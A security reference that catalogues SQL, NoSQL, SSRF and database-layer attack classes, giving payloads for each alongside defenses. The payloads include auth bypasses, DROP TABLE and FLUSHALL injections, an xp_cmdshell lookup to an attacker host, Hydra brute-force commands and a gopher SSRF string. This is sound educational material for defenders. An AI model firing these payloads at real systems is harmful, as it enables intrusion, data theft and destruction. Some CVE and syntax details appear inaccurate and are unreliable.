# SQL Injection Attack Vectors — Deep Research Reference

> **Scope:** This document covers every major SQL injection and database-layer attack class, how each one works mechanically, what it looks like in real payloads, how it differs from the others, and what actually stops it.

---

## Table of Contents

1. [Classic SQL Injection](#1-classic-sql-injection)
2. [Dynamic Table / Column Injection](#2-dynamic-table--column-injection)
3. [ORM Operator Injection](#3-orm-operator-injection)
4. [Second-Order Injection](#4-second-order-injection)
5. [Stored Procedure Dynamic SQL](#5-stored-procedure-dynamic-sql)
6. [LIKE Wildcard Abuse](#6-like-wildcard-abuse)
7. [DB Driver CVE (e.g., CVE-2022-21724)](#7-db-driver-cve-eg-cve-2022-21724)
8. [Search Path Injection (CVE-2018-1058)](#8-search-path-injection-cve-2018-1058)
9. [Credential Stuffing on DB Port](#9-credential-stuffing-on-db-port)
10. [NoSQL Injection (Parallel Stack)](#10-nosql-injection-parallel-stack)
11. [SSRF to Internal DB](#11-ssrf-to-internal-db)
12. [Comparison Matrix](#12-comparison-matrix)
13. [Defense Cheat Sheet](#13-defense-cheat-sheet)

---

## 1. Classic SQL Injection

### What It Is

The original, most well-known attack. User-controlled input is concatenated directly into a SQL string without being treated as data. The attacker's text is parsed as SQL syntax, letting them alter the query's logic.

### How It Works

A login form might generate this query:

```sql
-- Vulnerable code (Python string concatenation)
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

The developer expects `username = alice`, producing:

```sql
SELECT * FROM users WHERE username='alice' AND password='secret'
```

An attacker submits `username = ' OR '1'='1' --`:

```sql
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything'
```

The `--` comments out the rest. `'1'='1'` is always true, so every row matches and the attacker logs in as the first user (often an admin).

### Attack Variations

| Variant | Technique | Goal |
|---|---|---|
| **UNION-based** | `' UNION SELECT username,password,null FROM users --` | Exfiltrate data in-band |
| **Boolean-based blind** | `' AND 1=1 --` vs `' AND 1=2 --` | Infer data one bit at a time from different app responses |
| **Time-based blind** | `'; IF (1=1) WAITFOR DELAY '0:0:5' --` | Infer data by measuring response time |
| **Error-based** | `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --` | Extract data via DB error messages |
| **Stacked queries** | `'; DROP TABLE users; --` | Run arbitrary second query (driver-dependent) |
| **Out-of-band** | `'; EXEC xp_cmdshell('nslookup attacker.com') --` | Exfiltrate via DNS/HTTP when in-band is blind |

### Real Payload Examples

```
-- Bypass authentication
' OR 1=1 --
admin'--
' OR 'x'='x

-- UNION exfiltration (determine column count first)
' ORDER BY 3 --        <- increases until error; 3 columns confirmed
' UNION SELECT null,null,null --
' UNION SELECT table_name,null,null FROM information_schema.tables --

-- Time-based blind (PostgreSQL)
'; SELECT pg_sleep(5) --

-- Time-based blind (MySQL)
' AND SLEEP(5) --

-- Time-based blind (MSSQL)
'; WAITFOR DELAY '0:0:5' --
```

### What Stops It

**Parameterized queries / prepared statements.** The query structure is sent to the DB engine separately from the data. The DB parser never sees the user's value as SQL text — it is bound as a typed parameter after parsing.

```python
# SAFE — parameterized
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))

# UNSAFE — concatenation
cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")
```

Parameterization is 100% effective against classic SQLi because the user value is *never interpreted as SQL*.

---

## 2. Dynamic Table / Column Injection

### What It Is

Parameterized queries bind **values** (strings, integers, dates). They cannot bind **structural SQL identifiers** — table names, column names, `ORDER BY` fields, or keywords like `ASC`/`DESC`. When an application builds these dynamically from user input, parameterization offers zero protection.

### How It Works

An API lets users sort results:

```python
# Developer thinks parameterization works here — it does NOT
column = request.args.get("sort")
query = f"SELECT * FROM products ORDER BY {column}"
```

`column = price` → `ORDER BY price` — works fine.  
`column = price; DROP TABLE products; --` → catastrophic stacked query.

More subtly:

```
column = (SELECT password FROM users LIMIT 1)
```

→ `ORDER BY (SELECT password FROM users LIMIT 1)` — this actually executes and the sort behavior leaks information about the password string.

### Attack Variations

```sql
-- Information extraction via sort order (boolean blind)
-- If the first character of the admin password is 'a', rows sort one way; else another
ORDER BY (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN price ELSE name END FROM users WHERE role='admin')

-- Table name injection
SELECT * FROM [user_controlled_table]    -- attacker pivots to a sensitive table

-- Schema discovery
SELECT * FROM information_schema.columns WHERE table_name = '[input]'
```

### Real Payload Examples

```
GET /products?sort=price                   -- benign
GET /products?sort=(SELECT+sleep(5))       -- time-based blind
GET /products?sort=1;DROP+TABLE+users;--   -- destructive
GET /products?sort=CASE+WHEN+(SELECT+COUNT(*)+FROM+users)>0+THEN+price+ELSE+name+END
```

### What Stops It

**Allowlist validation** — never SQL escaping or parameterization for identifiers.

```python
ALLOWED_SORT_COLUMNS = {"price", "name", "created_at"}
ALLOWED_DIRECTIONS = {"ASC", "DESC"}

sort_col = request.args.get("sort", "name")
direction = request.args.get("dir", "ASC").upper()

if sort_col not in ALLOWED_SORT_COLUMNS or direction not in ALLOWED_DIRECTIONS:
    abort(400)

query = f"SELECT * FROM products ORDER BY {sort_col} {direction}"
```

Only safe, pre-approved strings are ever interpolated. User input never reaches SQL directly.

---

## 3. ORM Operator Injection

### What It Is

Object-Relational Mappers (Django ORM, Mongoose, Sequelize, Prisma, etc.) accept structured query operators from code. Some applications pass HTTP request keys or values directly into these operator dictionaries, letting an attacker inject operators that change query semantics without writing a single character of SQL.

### How It Works

**Mongoose (MongoDB) example:**

```javascript
// Vulnerable — spreads request body directly into query
const user = await User.findOne({ username: req.body.username, password: req.body.password });
```

Normal request: `{ "username": "alice", "password": "secret" }`  
Attack request: `{ "username": "alice", "password": { "$gt": "" } }`

MongoDB interprets `{ "$gt": "" }` as "password greater than empty string" — which is true for *any* non-empty password. Authentication bypassed.

**Django ORM example:**

```python
# Vulnerable — passes request data keys as ORM field lookups
User.objects.filter(**request.GET.dict())
```

An attacker crafts: `GET /users?username=alice&password__isnull=true`

Django's ORM expands `password__isnull=true` into `WHERE password IS NULL`, completely bypassing the password check.

### Attack Variations

| ORM | Dangerous Operators | Effect |
|---|---|---|
| Mongoose | `$gt`, `$ne`, `$where`, `$regex` | Auth bypass, data exfil, JS execution |
| Django | `__isnull`, `__in`, `__regex`, `__startswith` | Logic bypass, data enumeration |
| Sequelize | `[Op.or]`, `[Op.like]`, `[Op.regexp]` | Logic manipulation |
| ActiveRecord | Hash conditions, `where(params)` | Mass assignment / logic bypass |

### Real Payload Examples

```json
// Mongoose auth bypass via $ne (not equal)
POST /login
{ "username": { "$ne": null }, "password": { "$ne": null } }

// Mongoose regex enumeration — extracts passwords character by character
{ "username": "admin", "password": { "$regex": "^a" } }
{ "username": "admin", "password": { "$regex": "^ab" } }

// Django field injection
GET /api/users?is_superuser=true
GET /api/users?email__startswith=admin
GET /api/users?date_joined__year=2020&is_staff=true
```

### What Stops It

**Request schema validation.** Define the exact shape of every API input before it touches the ORM.

```python
# Pydantic schema validation (Python / FastAPI)
class LoginRequest(BaseModel):
    username: str
    password: str
    # Only these two fields. No operator keys possible.

# Only accepts plain strings, not dicts or operator objects
```

```javascript
// Joi schema (Node.js)
const schema = Joi.object({
  username: Joi.string().alphanum().required(),
  password: Joi.string().required()
  // Rejects any key that isn't username/password
  // Rejects any value that isn't a plain string
});
```

---

## 4. Second-Order Injection

### What It Is

Data is stored safely (input is escaped or parameterized when written), but later retrieved and used **unsafely** in a second SQL statement. The injection payload "sleeps" in the database and detonates later, often in a completely different part of the application or in admin tooling.

### How It Works

**Step 1 — Store safely:**

```python
# Registration — input is parameterized. Safe write.
cursor.execute("INSERT INTO users (username) VALUES (%s)", (username,))
```

Attacker registers with username: `admin'--`  
Database stores the string literally: `admin'--` — no harm yet.

**Step 2 — Retrieve and reuse unsafely:**

```python
# Password-change flow — retrieves stored username and concatenates it into new query
user = cursor.execute("SELECT username FROM users WHERE id = %s", (session['id'],))
stored_name = user[0]  # Retrieved from DB: admin'--

# Developer assumes DB values are safe — WRONG
cursor.execute("UPDATE users SET password = '" + new_password + "' WHERE username = '" + stored_name + "'")
```

This executes:
```sql
UPDATE users SET password = 'newpass' WHERE username = 'admin'--'
```

The `--` comments out the closing quote and rest of the WHERE clause, so the UPDATE affects the `admin` account instead of the attacker's account. Attacker now controls the admin password.

### Why It's Especially Dangerous

- Input validation and parameterization at the *entry* point don't help — data looks safe when stored.
- The vulnerable query is often in a *different subsystem*: admin panels, batch jobs, reports, logging pipelines, email templates.
- Traditional scanning tools and code reviews focused on HTTP entry points may miss it entirely.
- May lie dormant for months before triggering.

### Real-World Scenario

```
1. Attacker creates username: '); INSERT INTO admins VALUES ('hacker','pwned')--
2. App stores this safely via parameterized insert.
3. A cron job runs nightly: "SELECT username FROM users WHERE active=1"
   Then for each user: "EXEC sp_send_email '" + username + "'"
4. The stored payload executes inside the cron job's dynamic SQL.
```

### What Stops It

Treat data retrieved from the database with the **same distrust as raw user input**. Any value that originated outside your code — including your own database rows — must be parameterized when used in a subsequent query.

```python
# WRONG — trusting that DB values are safe
name_from_db = row['username']
cursor.execute("UPDATE logs SET entry = '" + name_from_db + "'")  # Still injectable

# CORRECT — parameterize regardless of source
cursor.execute("UPDATE logs SET entry = %s", (name_from_db,))
```

---

## 5. Stored Procedure Dynamic SQL

### What It Is

Stored procedures are commonly believed to prevent SQL injection — and they do, **if written correctly**. But a stored procedure that builds a SQL string internally and executes it with `EXEC` or `sp_executesql` is vulnerable in exactly the same way as application-level string concatenation.

### How It Works

```sql
-- VULNERABLE stored procedure
CREATE PROCEDURE SearchProducts @category NVARCHAR(100)
AS BEGIN
    DECLARE @sql NVARCHAR(500)
    SET @sql = 'SELECT * FROM products WHERE category = ''' + @category + ''''
    EXEC(@sql)  -- Executes dynamically built string — injectable
END
```

Calling it safely: `EXEC SearchProducts 'electronics'`  
Calling it maliciously: `EXEC SearchProducts 'x'' UNION SELECT username,password,null FROM users --'`

The procedure call itself is parameterized from the app, but the injection happens *inside* the procedure when `@sql` is constructed.

### The Misconception

Most developers call the procedure like this:

```python
cursor.execute("EXEC SearchProducts %s", (user_input,))  # Parameterized call
```

They believe parameterization here closes the risk. It does — but only for the outer call. The dynamic SQL *inside* the procedure is a separate, new SQL execution with its own injection surface.

### Safe Rewrite Using sp_executesql

```sql
-- SAFE — uses parameterized dynamic SQL inside the procedure
CREATE PROCEDURE SearchProducts @category NVARCHAR(100)
AS BEGIN
    DECLARE @sql NVARCHAR(500)
    SET @sql = N'SELECT * FROM products WHERE category = @cat'
    EXEC sp_executesql @sql, N'@cat NVARCHAR(100)', @cat = @category
    -- @category is bound as a parameter to the inner dynamic query
END
```

### What Stops It

Fix the procedure itself, not just the application call. Audit every stored procedure for `EXEC(@sql)` patterns and replace with `sp_executesql` with proper parameter binding.

---

## 6. LIKE Wildcard Abuse

### What It Is

SQL's `LIKE` operator uses two special characters: `%` (match any sequence) and `_` (match any single character). When user input is bound as a parameterized value inside a `LIKE` clause, these characters are **not** stripped or escaped by the DB driver — they remain functional as wildcards. This is not classic injection (no SQL structure is altered), but it enables performance attacks and data enumeration.

### How It Works

```python
# Parameterized — no SQL injection possible
cursor.execute("SELECT * FROM users WHERE email LIKE %s", ('%' + search_term + '%',))
```

If `search_term = '%'`, the query becomes:

```sql
SELECT * FROM users WHERE email LIKE '%%%'
```

Which matches **every row** in the table — a full table scan on potentially millions of records.

If `search_term = 'a%a%a%a%a%a%a%a%a%'`, the LIKE engine backtracks exponentially through the string — a Regex DoS-equivalent for SQL (ReDoS-style).

### Attack Scenarios

```
-- Enumeration: Is there a user whose email starts with "admin"?
search = "admin%"    → LIKE 'admin%'    → leaks existence

-- Single-char wildcard enumeration
search = "a_min"     → LIKE 'a_min'     → matches "admin", "abmin", etc.

-- Performance attack (full scan)
search = "%"         → LIKE '%%%'       → returns all rows, kills DB

-- Catastrophic backtracking
search = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab%"  → exponential evaluation time
```

### What Stops It

Escape wildcard characters before binding. This is not handled automatically by drivers.

```python
def escape_like(value: str) -> str:
    return value.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_")

safe_term = escape_like(user_input)
cursor.execute("SELECT * FROM users WHERE email LIKE %s ESCAPE '\\'", ('%' + safe_term + '%',))
```

Also enforce maximum input length and consider rate limiting search endpoints.

---

## 7. DB Driver CVE (e.g., CVE-2022-21724)

### What It Is

A vulnerability in the database **driver itself** (the library your application uses to connect to the database), rather than in your SQL code. These are exploitable regardless of whether your queries are parameterized, because the flaw lies in how the driver processes connection strings, data types, protocol messages, or authentication flows.

### CVE-2022-21724 — pgjdbc (PostgreSQL JDBC Driver)

**Affected:** pgjdbc versions before 42.3.3, 42.2.26  
**Vector:** JDBC connection string parameter injection

The pgjdbc driver allowed certain connection string parameters to be passed through user-controlled input without sufficient sanitization. An attacker who could influence the JDBC URL (e.g., via a multi-tenant system that builds connection strings from user-supplied database host/name fields) could inject additional parameters:

```
jdbc:postgresql://host/db?socketFactory=org.postgresql.ssl.NonValidatingFactory&socketFactoryArg=...
```

By injecting `socketFactory` or `sslfactory` parameters, an attacker could:
- Disable SSL validation (enabling MITM attacks)
- Load arbitrary classes (potential RCE depending on classpath)
- Redirect the connection to an attacker-controlled host

### Other Notable Driver CVEs

| CVE | Driver | Vulnerability |
|---|---|---|
| CVE-2022-21724 | pgjdbc | Connection string parameter injection |
| CVE-2021-22118 | Spring Data | JDBC URL injection in multi-datasource configs |
| CVE-2019-14540 | jackson-databind | Deserialization via DB driver gadget chains |
| CVE-2016-6662 | MySQL Server | mysql_config_editor privilege escalation |
| CVE-2015-3152 | libmysqlclient | MITM via SSL downgrade ("BACKRONYM") |

### Why It's Different From SQL Injection

- Your SQL is perfectly written — parameterized, no dynamic strings
- The vulnerability is in **how the driver communicates**, not in your queries
- Exploitation often happens at **connection time**, before any query is sent
- May affect every application using the driver, regardless of coding quality

### What Stops It

- **Patch your drivers.** Keep database driver versions pinned to the latest patched release. Include them in your dependency CVE scanning pipeline (Dependabot, Snyk, OWASP Dependency-Check).
- **Never build JDBC/connection URLs from user input.**
- Subscribe to the driver project's security advisories.

---

## 8. Search Path Injection (CVE-2018-1058)

### What It Is

PostgreSQL (and some other databases) use a **search path** — an ordered list of schemas that the database checks when resolving unqualified object names. CVE-2018-1058 describes a class of attack where a low-privileged user creates a function or object in a schema that appears earlier in the search path than the intended schema, causing privileged code to unknowingly execute the attacker's object.

### How PostgreSQL Schema Resolution Works

```sql
-- If search_path = public, pg_catalog
SELECT * FROM users;
-- PostgreSQL looks for: public.users first, then pg_catalog.users
```

### The Attack

1. A database has `search_path = "$user", public` (common default).
2. A superuser runs a maintenance script that calls `SELECT my_utility_func()` — unqualified.
3. A low-privilege attacker creates: `CREATE FUNCTION public.my_utility_func() RETURNS void AS $$ BEGIN EXECUTE 'GRANT SUPERUSER TO attacker'; END $$ LANGUAGE plpgsql SECURITY DEFINER;`
4. When the superuser's script calls `my_utility_func()`, PostgreSQL resolves it to `public.my_utility_func()` — the attacker's function — and executes it with superuser privileges (`SECURITY DEFINER`).

### Variants

```sql
-- Hijack a built-in operator
CREATE FUNCTION public.=(text,text) RETURNS bool AS $$ ...attacker code... $$ LANGUAGE plpgsql;
-- Any comparison of text values now routes through attacker's function

-- Hijack a trusted extension function
-- If an extension installed to "public" calls unqualified helpers, those can be hijacked
```

### Real Impact

- A low-privilege DB user (e.g., the application's DB account) can escalate to superuser
- Affects scheduled jobs, pg_dump, vacuuming, and extension code
- Completely invisible to the application — no anomalous SQL is ever sent

### What Stops It

**Always qualify schema names** in SQL code, stored procedures, and extension code:

```sql
-- VULNERABLE
SELECT * FROM users;
EXECUTE my_function();

-- SAFE
SELECT * FROM myapp.users;
EXECUTE myapp.my_function();
```

Also set a restrictive, explicit search path for every database role:

```sql
ALTER ROLE app_user SET search_path = myapp;  -- Only myapp schema, not public
```

---

## 9. Credential Stuffing on DB Port

### What It Is

This is not a SQL injection attack — it is a **network-level** attack. Database servers expose ports (PostgreSQL: 5432, MySQL: 3306, MSSQL: 1433, MongoDB: 27017, Redis: 6379). If these ports are reachable from the internet or from untrusted network segments, an attacker can attempt to authenticate directly to the database using credential lists from previous data breaches.

### How It Works

```
1. Attacker obtains a credential dump from a previous breach (e.g., rockyou2021.txt).
2. Scans the internet for open port 5432 (PostgreSQL).
3. Attempts each username:password pair directly against the DB server.
4. If successful, attacker has a direct psql shell — no application layer involved.
5. No injection needed. No logs in the application. Direct data access.
```

### Tools Used by Attackers

```bash
# Hydra — brute-force any DB
hydra -L users.txt -P passwords.txt postgresql://target:5432/dbname

# Medusa
medusa -h target -U users.txt -P passwords.txt -M postgres

# Shodan queries to find exposed DBs
port:5432 PostgreSQL
port:27017 MongoDB  ← historically huge problem; many MongoDB instances had no auth
port:6379 Redis     ← Redis had no auth by default for years
```

### Why This Is Categorically Different

All other attacks in this document exploit flaws in SQL code, configuration, or the driver. Credential stuffing bypasses all of that:
- A perfectly written application with no SQL injection
- Full parameterization, ORM validation, schema qualification
- Still fully compromised if the DB port is reachable and credentials are weak/reused

### Real-World Scale

MongoDB's "Meow Attack" (2020): automated bot scanned for open MongoDB instances (no auth required in older defaults) and deleted all databases, leaving a file named "meow". Approximately 4,000 databases were wiped.

### What Stops It

- **Network firewall:** DB ports must never be reachable from the internet. Bind to localhost or a private network interface only.
- **Allowlist IP rules:** DB server should only accept connections from known application server IPs.
- **Strong, unique credentials:** No shared passwords with other systems.
- **Disable remote root / superuser login.**
- **Monitoring and alerting:** Alert on repeated authentication failures.

---

## 10. NoSQL Injection (Parallel Stack)

### What It Is

NoSQL databases (MongoDB, Redis, CouchDB, Cassandra, Elasticsearch, Firebase) have their own query languages and input parsing mechanisms. "NoSQL injection" is an umbrella term for attacks that manipulate these mechanisms — entirely separate from SQL, but analogous in concept.

### MongoDB Operator Injection

Already covered partially in §3. The full scope:

```javascript
// Authentication bypass via $ne
{ "username": "admin", "password": { "$ne": "x" } }
// Matches: password != "x" — true for any real password

// Data enumeration via $where (JavaScript execution — extremely dangerous)
{ "$where": "this.username.match(/admin/)" }

// $where for time-based blind extraction
{ "$where": "if(this.password[0] == 'a') { sleep(5000); return true; } return false;" }
// If response takes 5s, first char of password is 'a'

// Array operator abuse
{ "username": { "$in": ["admin", "administrator", "root"] } }
```

### Redis Injection

Redis commands are sent as plain text. If user input reaches a raw Redis command:

```
// Application builds: HGET user:{id} password
// Attacker controls id: 1\r\nFLUSHALL\r\n
// Sends: HGET user:1\r\nFLUSHALL\r\n  ← two commands; FLUSHALL wipes all data
```

### Elasticsearch Injection

Elasticsearch uses JSON query DSL. If user input is interpolated:

```json
{
  "query": {
    "match": {
      "name": "user_input_here"
    }
  }
}
```

Attacker input: `{"match_all": {}}` (if parsed as object rather than string)  
→ Returns all documents in the index.

### CouchDB / Firebase

Map-reduce views and Firebase rules can be bypassed via operator/path injection if user data is used in view keys or rule evaluation.

### Key Difference from SQL Injection

| Dimension | SQL Injection | NoSQL Injection |
|---|---|---|
| Query language targeted | SQL (structured text) | JSON, BSON, Redis protocol, DSL |
| Injection character | `'`, `--`, `;` | `$`, `{`, `}`, `\r\n`, object nesting |
| Parameterization fix? | Yes (fully) | Partially — operators inject via structure |
| JavaScript execution risk | Indirect (via SQL functions) | Direct (`$where` in MongoDB) |

### What Stops It

- **Input schema validation** — reject any value that is not a plain scalar (string, number, boolean) when a scalar is expected. Reject object/array values at the API boundary.
- **Disable dangerous operators** — disable MongoDB's `$where` and `mapReduce` if not needed. Use `mongod --noscripting`.
- **Use typed ODM/ORM layers** (Mongoose schemas) with strict mode enabled.
- **For Redis:** use a client library that sends commands as RESP arrays, never raw string concatenation.

---

## 11. SSRF to Internal DB

### What It Is

Server-Side Request Forgery (SSRF) is a class of attack where an attacker tricks the server into making HTTP (or other protocol) requests to internal destinations. When combined with databases that expose HTTP APIs or use text-based protocols, SSRF can be used to query or manipulate the database without any SQL injection.

### How It Works

**CouchDB / Elasticsearch example:**

```
1. Application has a feature: "Fetch remote image from URL"
2. Server makes an outbound HTTP request to the user-supplied URL
3. Attacker supplies: http://localhost:9200/_cat/indices?v  (Elasticsearch's REST API)
4. Server fetches this URL and returns the response — exposing all ES index names
5. Further: http://localhost:9200/users/_search?q=*  → dumps all user documents
6. DELETE via SSRF: the server can make POST/DELETE requests internally
```

**Redis SSRF via Gopher protocol:**

```
gopher://localhost:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
```

This is a URL-encoded Redis command (`FLUSHALL`) delivered over the `gopher://` scheme. Many HTTP libraries support gopher, and Redis speaks plain text — so a single SSRF request can execute arbitrary Redis commands.

**MongoDB REST API (deprecated but existed):**

```
http://localhost:28017/admin/   → MongoDB admin interface
http://localhost:28017/users/?filter_username=admin  → Query users collection
```

### Why It's Different From Everything Else

SSRF is not a database flaw at all — it is an application-level flaw in a feature that makes outbound requests. The database might be perfectly configured, with no exposed external ports, no weak passwords. But if one application endpoint can be redirected to localhost, the entire internal network becomes accessible, including databases that are intentionally not internet-facing.

```
Internet → [App Server (SSRF vuln)] → [Internal DB on 127.0.0.1:9200]
                                            ↑
                                    Never directly reachable from internet
                                    but reachable via SSRF
```

### What Stops It

**SSRF Protection:**
- Validate and allowlist URLs before the server makes outbound requests.
- Block requests to `127.0.0.1`, `::1`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16` (link-local / cloud metadata).
- Disable dangerous URL schemes: `gopher://`, `file://`, `dict://`, `ftp://`.
- Use a dedicated outbound proxy that enforces the allowlist.
- Even with SSRF protection, databases with HTTP APIs should require authentication.

---

## 12. Comparison Matrix

| Attack | SQL Text Injected? | Parameterization Stops It? | Fix Location | Difficulty to Detect |
|---|---|---|---|---|
| Classic SQLi | ✅ Yes | ✅ Yes | Application query layer | Low (scanners find it) |
| Dynamic table/column | ✅ Yes | ❌ No | Application allowlist | Medium |
| ORM operator injection | ❌ No (structure) | ❌ No | API input schema | Medium |
| Second-order injection | ✅ Yes | ❌ Partial* | All query layers | High |
| Stored proc dynamic SQL | ✅ Yes (inside proc) | ❌ No | Stored procedure code | High |
| LIKE wildcard abuse | ❌ No | ❌ No (params preserve %) | Wildcard escaping | Low |
| DB driver CVE | ❌ No | ❌ No | Driver patch | Low (if CVE is known) |
| Search path injection | ❌ No (schema hijack) | ❌ No | Schema qualification | Very High |
| Credential stuffing | ❌ No | ❌ No | Network firewall | Medium |
| NoSQL injection | ❌ No (JSON/DSL) | ❌ Partial | Input schema validation | Medium |
| SSRF to DB | ❌ No | ❌ No | SSRF protection layer | High |

*Second-order: parameterization stops it if applied to **all** downstream queries, not just the entry point.

---

## 13. Defense Cheat Sheet

### Application Layer

```python
# 1. Always parameterize — no exceptions
cursor.execute("SELECT * FROM t WHERE id = %s", (user_id,))

# 2. Allowlist structural identifiers
assert column_name in {"id", "name", "email"}

# 3. Validate input schema strictly
class SearchInput(BaseModel):
    q: str = Field(max_length=100)  # Plain string only; no nested objects

# 4. Treat DB output as untrusted (second-order defense)
cursor.execute("UPDATE t SET x = %s WHERE y = %s", (value_from_db, condition))

# 5. Escape LIKE wildcards
safe = user_input.replace("%", "\\%").replace("_", "\\_")
```

### Database Layer

```sql
-- 6. Qualify all schema names
SELECT * FROM myapp.users;  -- not: SELECT * FROM users

-- 7. Restrict search path per role
ALTER ROLE app_user SET search_path = myapp;

-- 8. Use sp_executesql inside stored procedures (MSSQL)
EXEC sp_executesql @sql, N'@param NVARCHAR(100)', @param = @input;

-- 9. Principle of least privilege
GRANT SELECT, INSERT, UPDATE ON myapp.orders TO app_user;
-- Never: GRANT ALL PRIVILEGES ON *.* TO app_user;
```

### Infrastructure Layer

```bash
# 10. Never expose DB ports to internet
iptables -A INPUT -p tcp --dport 5432 -s 10.0.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 5432 -j DROP

# 11. Keep drivers patched
pip list --outdated | grep -i psycopg
npm audit

# 12. Block SSRF to internal ranges (nginx / WAF rule)
# Deny requests to RFC1918 and loopback
```

### NoSQL Specific

```javascript
// 13. Reject non-scalar values at API boundary
if (typeof req.body.password !== 'string') return res.status(400).send('Invalid');

// 14. Disable MongoDB scripting
mongod --setParameter javascriptEnabled=0

// 15. Use Mongoose strict schema
const userSchema = new Schema({ username: String, password: String }, { strict: true });
// strict: true rejects any keys not in the schema
```

---

## References

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- OWASP Testing Guide — ORM Injection: https://owasp.org/www-project-web-security-testing-guide/
- CVE-2022-21724 (pgjdbc): https://nvd.nist.gov/vuln/detail/CVE-2022-21724
- CVE-2018-1058 (PostgreSQL search path): https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058
- PortSwigger SQL Injection Labs: https://portswigger.net/web-security/sql-injection
- MongoDB Operator Injection: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- SSRF Bible: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- PayloadsAllTheThings SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

---

*Document generated for security research and developer education. All payloads shown for defensive understanding only.*
